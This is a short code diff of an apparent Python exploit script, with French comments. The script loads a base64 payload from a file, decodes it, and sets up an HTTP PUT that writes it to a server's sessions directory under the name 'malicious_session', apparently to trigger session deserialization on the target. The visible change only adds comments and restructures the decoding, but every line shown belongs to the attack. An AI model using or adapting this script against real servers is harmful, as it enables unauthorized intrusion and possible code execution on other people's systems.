@@ -5,9 +5,12 @@ target_url = "http://192.168.1.6:9090"
 payload_file = "payload.b64"
 session_id = "malicious_session"
 
+# Lire le contenu du fichier payload.b64
 with open(payload_file, "r") as f:
     payload_base64 = f.read().strip()
-    payload = base64.b64decode(payload_base64)
+
+# Décoder la chaîne Base64 en données binaires
+payload = base64.b64decode(payload_base64)
 
 headers = {"Content-Type": "application/octet-stream"}
 put_url = f"{target_url}/sessions/{session_id}.session"
